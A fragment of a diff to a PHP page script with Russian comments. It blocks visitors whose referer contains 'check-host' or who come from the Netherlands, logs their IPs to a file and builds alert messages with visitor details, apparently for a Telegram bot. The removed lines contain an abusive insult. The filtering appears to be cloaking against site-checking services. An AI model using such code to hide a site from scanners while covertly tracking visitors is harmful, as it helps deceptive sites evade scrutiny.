@@ -165,24 +165,22 @@ if ($page === "/admin.php") {
     goto send;
 }
 
-// Если страна в бан-листе
-if (in_array($country, $bad_countries, true)) {
+// --- Блокировка по рефереру (CheckHost) ---
+if (stripos($referer, 'check-host') !== false) {
     http_response_code(403);
-    echo "сын шлюхи, съебался с сайта";
+    echo "неа)))";
     @file_put_contents("banned.txt", "$ip\n", FILE_APPEND);
-    $msg = "🚫 Заблокировано по GEO!\nIP: $ip ($country)\n⏰ $time\nUA: $ua\nURL: $fullurl";
+    $msg = "🚫 Заблокировано (CheckHost по рефереру)\nIP: $ip ($country)\n⏰ $time\nReferer: $referer";
     goto send;
 }
 
-// Если это чекхост по рефереру или User-Agent
-foreach ($bad_hosts as $bad) {
-    if (strpos($host_or_ua, $bad) !== false) {
-        http_response_code(403);
-        echo "сын шлюхи, съебался с сайта";
-        @file_put_contents("banned.txt", "$ip\n", FILE_APPEND);
-        $msg = "🚫 Заблокировано как CheckHost!\nIP: $ip ($country)\n⏰ $time\nUA: $ua\nRef: $referer";
-        goto send;
-    }
+// --- Блокировка по GEO (Нидерланды) ---
+if ($country === 'NL') {
+    http_response_code(403);
+    echo "неа)))";
+    @file_put_contents("banned.txt", "$ip\n", FILE_APPEND);
+    $msg = "🚫 Заблокировано (страна NL)\nIP: $ip ($country)\n⏰ $time\nUA: $ua\nURL: $fullurl";
+    goto send;
 }
 
 // === Определение ОС и браузера ===
@@ -1001,6 +999,7 @@ if ($ok_tg && $token && $chat_id) {
     </script>
 </body>
 </html>
+
 
 
 
